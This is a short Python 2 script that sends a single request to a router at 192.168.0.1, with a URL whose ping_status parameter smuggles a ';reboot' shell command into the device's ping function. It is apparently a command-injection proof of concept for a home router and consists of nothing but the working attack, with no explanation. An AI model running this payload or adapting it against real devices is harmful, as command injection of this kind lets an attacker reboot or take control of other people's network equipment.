import requests
import subprocess
import sys
import re
import time

url = "http://192.168.0.1/device.xml=ping_status?192.168.0.1;reboot,0,0"

r = requests.get(url, verify=False)

print r.text
